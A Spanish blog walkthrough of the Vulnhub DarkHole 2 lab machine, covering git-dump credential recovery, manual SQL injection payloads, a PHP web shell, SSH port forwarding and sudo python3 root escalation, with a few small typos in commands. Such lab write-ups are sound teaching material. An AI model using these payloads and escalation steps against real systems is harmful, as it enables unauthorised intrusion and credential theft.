---
title: "DarkHole 2 - Vulnhub"
layout: post
date: 2023-12-14 22:10
tags:
  - Vulnhub
  - DarkHole
  - RCE
  - BruteForce
  - php
  - Pivoting
  - Information Leakage
  - Github Enumeration
  - SQLI
  - Port Forwarding
  - Bash History
  - Abusing Sudoers
image: /assets/images/Darkhole2/Darkhole2.png
headerImage: true
projects: false
hidden: false
description: "DarkHole 2 - Vunlhub"
category: blog
author: CAHOn3R
externalLink: false
---
# Reconocimiento

Como de costumbre al tratarse de una maquina de *Vulnhub* y correrla en local empezaremos el reconocimiento escaneando nuestra propia red con **arp-scan** para encontrar la **IP** de la maquina victima.

```bash
❯ arp-scan -I eth0 --localnet --ignoredups
192.168.0.19	00:0c:29:b0:7d:26	VMware, Inc.

-I # para especificar la Interfaz que queremos escanear
--localnet # para decir que queremos que sea un escaneo local
--ignoredups # para que no reporte duplicados
```

La **IP** maquina victima es **192.168.0.19** así que procedemos a realizar el escaneo de puertos con **nmap**
```bash
❯ nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn -oG allPorts 192.168.0.19

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 00:0C:29:B0:7D:26 (VMware)
```

Nos reporta 2 puertos abiertos, 22 **ssh** y 80 **http** ahora trataremos de ver lar versiones y servicios que corren en estos puertos.
```bash
❯ nmap -sCV -p 22,80 192.168.0.19 -oN targeted

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 57:b1:f5:64:28:98:91:51:6d:70:76:6e:a5:52:43:5d (RSA)
|   256 cc:64:fd:7c:d8:5e:48:8a:28:98:91:b9:e4:1e:6d:a8 (ECDSA)
|_  256 9e:77:08:a4:52:9f:33:8d:96:19:ba:75:71:27:bd:60 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: DarkHole V2
| http-git: 
|   192.168.0.19:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: i changed login.php file for more secure 
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
``` 
Como podemos ver en el puerto 80 esta corriendo un **Apache 2.4.41** y en el puerto 22 **OpenSSH 8.2p1** si la version fuese menor a la 7.7 podría ser vulnerable a **user enumeration**, pero com no es el caso de momento nos sirve de bien  poco.
Lo que mas me llama la atención es el directorio **.git**, al verlo me viene a la mente la herramienta [git-dumper.py](https://github.com/arthaud/git-dumper)
```bash
❯ git log --oneline
0f1d821 (HEAD -> master) i changed login.php file for more secure
a4d900a I added login.php file with default credentials
aa2a5f3 First Initialize
❯ git diff a4d900a
diff --git a/login.php b/login.php
index 8a0ff67..0904b19 100644
--- a/login.php
+++ b/login.php
@@ -2,7 +2,10 @@
 session_start();
 require 'config/config.php';
 if($_SERVER['REQUEST_METHOD'] == 'POST'){
-    if($_POST['email'] == "lush@admin.com" && $_POST['password'] == "321"){
+    $email = mysqli_real_escape_string($connect,htmlspecialchars($_POST['email']));
+    $pass = mysqli_real_escape_string($connect,htmlspecialchars($_POST['password']));
+    $check = $connect->query("select * from users where email='$email' and password='$pass' and id=1");
+    if($check->num_rows){
         $_SESSION['userid'] = 1;
         header("location:dashboard.php");
         die();
```
Con la herramienta me descargo el directorio **.git/** y con **git** hago un `git log` y voy enumerando los logs hasta dar con el que tenemos aquí arriba y ver que se quitaron estas lineas del archivo **login.php** que casualmente tiene credenciales **lush@admin.com:321**
Aun no hemos enumerado la web y ya tenemos credenciales, no hay que esforzarse mucho en esto, hay un login, tenemos creds, para dentro.
[<img src="/assets/images/Darkhole2/captura1.png">](/assets/images/Darkhole2/captura1.png)
# Explotación

Lo que vemos es esto, y en lo que me fijo es en la **url**, no se por que mi cerebro me llevaba a pensar en una vulnerabilidad **IDOR**, pero no es el caso... Lo siguiente que pruebo es lo típico, meterle una comilla a la **url** y...
[<img src="/assets/images/Darkhole2/captura2.png">](/assets/images/Darkhole2/captura2.png)
Capturo la petición con **burpSuite** para trabajar mas cómodo.

**Pruebas realizadas en burpSuite**
```burpSuite
GET /dashboard.php?id=1'--+- HTTP/1.1  200 OK
GET /dashboard.php?id=1'+or+sleep(5)--+- HTTP/1.1 # El servidor tarda 5 segundos en responder
```
_despues de esto ya sabemos que el servidor es vulnerable a SQLI_

Vamos a explotarlo de manera manual
```bash
# Primero tenemos que obtener el numero de columnas que hay en la base de datos que se está utilizando
GET /dashboard.php?id=1'+order+by+6--+- 200 OK'
# Vamos iterando el numero hasta llegar al correcto

GET /dashboard.php?id=1'+unilon+select+1,2,3,4,5,6--+- '
# aqui bucamos alguno de los numeros en la web, como no veo ninguno de los números cambio el ID a 2

GET /dashboard.php?id=2'+unilon+select+1,2,3,4,5,6--+- 200 OK'
# Aquí el servidor nos devuelve los numeros así que podemos injectar codigo sql para enumerar las bases de datos

GET /dashboard.php?id=2'+unilon+select+1,2,database(),4,5,6--+-
darkhole_2' # Listar database
GET /dashboard.php?id=2'+union+select+"test","test",group_concat(table_name),"test","test","test"+from+information_schema.tables+where+table_schema='darkhole_2'--+- 
ssh,users' # listar tablas

GET /dashboard.php?id=2'+union+select+"test","test",group_concat(column_name),"test","test","test"+from+information_schema.columns+where+table_schema="darkhole_2"+and+table_name="ssh"--+-
id,pass,user' # listar columnas

GET /dashboard.php?id=2'+union+select+"test","test",group_concat(user,0x3a,pass),"test","test","test"+from+ssh--+-
jehad:fool' # Credenciales SSH
```
En la ultima petición podemos poner directamente la tabla **SSH** por que estamos listando la base de datos que está en uso, si no fuese así había que especificar la base de datos junto a la tabla por ejemplo `darkhole_2.ssh`.

Podemos conectarnos por **SSH**, tras la enumeración típica manual encuentro una [tarea cron](https://ayuda.hostalia.com/hc/es/articles/360017724357--Qu%C3%A9-es-un-cron-o-tarea-programada-)
[<img src="/assets/images/Darkhole2/captura3.png">](/assets/images/Darkhole2/captura3.png)
# Pivoting

Esta tarea se ejecuta como el usuario **losy** cada minuto, lo que hace es cambiarse al directorio /opt/web y iniciar un servidor web con php en el localhost por el puerto 9999,
me desplazo al directorio
```bash
cd /op/web

ls
index.php

cat index.php
<?php
echo "Parameter GET['cmd']";
if(isset($_GET['cmd'])){
echo system($_GET['cmd']);
}
?>
```
Vemos una "web Shell" o "PHP shell" que se ejecuta como **losy**, dado que nos hemos conectado por **SSH** voy a ir a lo cómodo y me voy a traer el puerto 9999 a mi maquina
```bash
ssh jehad@192.168.0.19 -L 9999:127.0.0.1:9999
```

Ahora en nuestro navegador vamos a la 127.0.0.1:9999 y donde realmente estamos apuntando es al puerto 9999 de la maquina victima, ahí vemos las **web shell**, así que nos entablamos una **reverse shell** por el puerto **443**

[<img src="/assets/images/Darkhole2/captura4.png">](/assets/images/Darkhole2/captura4.png)
En verde tenemos la reverse shell con bash poniéndonos en escucha en **netcat** por el puerto 443 y en azul el tratamiento de la **tty**, faltaría exportar las variables de entorno.
```bash
losy@darkhole:/opt/web$ export TERM=xterm SHELL=bash
losy@darkhole:/opt/web$ stty rows x columns x # aqui tus valores
```

> Puedes hacer un stty -a para consultar tus valores en tu maquina atacante

Ya estamos como el usuario **losy**, ahora hay que escalar privilegios.
en el directorio personal de **losy** hago un `ls -la` es una buena costumbre, lo hago siempre.
```bash
jehad@darkhole:~$ ls -la
total 40
drwxr-xr-x 5 jehad jehad 4096 Dec 14 16:01 .
drwxr-xr-x 5 root  root  4096 Sep  2  2021 ..
-rw------- 1 jehad jehad 5677 Dec 15 10:16 .bash_history
-rw-r--r-- 1 jehad jehad  220 Sep  2  2021 .bash_logout
-rw-r--r-- 1 jehad jehad 3771 Sep  2  2021 .bashrc
drwx------ 2 jehad jehad 4096 Sep  2  2021 .cache
drwxrwxr-x 3 jehad jehad 4096 Sep  2  2021 .local
-rw-r--r-- 1 jehad jehad  807 Sep  2  2021 .profile
drwx------ 2 jehad jehad 4096 Sep  3  2021 .ssh
```

lo que mas me llama la atención de aquí es que el archivo **.bash_history** no tenga un link simbólico al **2>/dev/null** ya que en los **CTF** es lo mas común de ver, le hago un **cat** y veo la **pass** del usuario **losy**
```bash
cat .bash_history
P0assw0rd losy:gang
```

# Escalada de Privilegios

Pruebo  a hacer un **sudo -l**
```bash
losy@darkhole:~$ sudo -l
[sudo] password for losy: 
User losy may run the following commands on darkhole:
    (root) /usr/bin/python3
```
Podemos ejecutar **python3** como el usuario **root** de manera temporal... Vamos a [gtfobins](https://gtfobins.github.io/gtfobins/python/#sudo) aun que en este caso no era necesario.

```bash
losy@darkhole:~$ sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
# whoami
root
# cat /root/root.txt
DarkHole{'Legend'}
```

